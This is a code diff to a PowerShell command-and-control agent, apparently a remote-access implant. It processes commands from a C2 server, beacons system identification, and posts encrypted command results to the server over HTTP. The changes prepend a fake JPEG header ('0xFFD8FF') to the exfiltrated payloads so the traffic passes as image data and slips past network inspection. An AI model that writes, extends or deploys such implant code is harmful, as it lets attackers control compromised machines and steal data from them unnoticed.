@@ -234,6 +234,7 @@ function Get-SystemIdentification {
 }
 
 # Function to process commands from the C2 server
+# Function to process commands from the C2 server
 function Process-Commands {
     param([array]$Commands)
     
@@ -293,8 +294,12 @@ function Process-Commands {
                         # On subsequent retries, try with encryption
                         else {
                             $encryptedResult = Encrypt-Data -PlainText $resultJson
+                            
+                            # Add JPEG header to disguise the data
+                            $jpegHeader = "0xFFD8FF"
+                            
                             $encryptedObj = @{
-                                data = $encryptedResult
+                                data = "$jpegHeader$encryptedResult"
                                 client_id = $global:clientId
                             }
                             $encryptedJson = ConvertTo-Json -InputObject $encryptedObj -Compress
@@ -361,6 +366,9 @@ function Process-Commands {
             $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
             $encryptedResult = Encrypt-Data -PlainText $resultJson
             
+            # Add JPEG header to disguise the data - AFTER encryption
+            $jpegHeader = "0xFFD8FF"
+            
             # Get current command result path
             $cmdResultPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "cmd_result_path" } else { $commandResultPath }
             $resultUrl = "http://$serverAddress$cmdResultPath"
@@ -373,7 +381,7 @@ function Process-Commands {
             
             # Create payload with encrypted data and client ID in plain text
             $payload = @{
-                data = $encryptedResult
+                data = "$jpegHeader$encryptedResult"
                 client_id = $global:clientId
             }
             $payloadJson = ConvertTo-Json -InputObject $payload -Compress
@@ -398,6 +406,9 @@ function Process-Commands {
             $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
             $encryptedResult = Encrypt-Data -PlainText $resultJson
             
+            # Add JPEG header to disguise the data - AFTER encryption
+            $jpegHeader = "0xFFD8FF"
+            
             # Get current command result path
             $cmdResultPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "cmd_result_path" } else { $commandResultPath }
             $resultUrl = "http://$serverAddress$cmdResultPath"
@@ -410,7 +421,7 @@ function Process-Commands {
             
             # Create payload with encrypted data and client ID in plain text
             $payload = @{
-                data = $encryptedResult
+                data = "$jpegHeader$encryptedResult"
                 client_id = $global:clientId
             }
             $payloadJson = ConvertTo-Json -InputObject $payload -Compress
@@ -595,14 +606,23 @@ function Start-AgentLoop {
             
             # Prepare the system info data
             $systemInfoRaw = Get-SystemIdentification
-            $encryptedSystemInfo = if ($null -eq $global:encryptionKey) { $systemInfoRaw } else { Encrypt-Data -PlainText $systemInfoRaw }
+            
+            # If we have an encryption key, encrypt the data
+            if ($null -ne $global:encryptionKey) {
+                $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfoRaw
+                # Add JPEG header to the encrypted data
+                $systemInfoWithHeader = "0xFFD8FF$encryptedSystemInfo"
+            } else {
+                # For first contact, don't encrypt or add header
+                $systemInfoWithHeader = $systemInfoRaw
+            }
             
             # Add this before the beacon payload creation
             Write-Host "DEBUG: Using client ID: $global:clientId"
             # Prepare the beacon payload - include client ID in plain text
             $beaconPayload = @{
                 client_id = $global:clientId
-                data = $encryptedSystemInfo
+                data = $systemInfoWithHeader
                 rotation_id = if ($global:pathRotationEnabled) { $global:currentRotationId } else { 0 }
             }
             $beaconJson = ConvertTo-Json -InputObject $beaconPayload -Compress
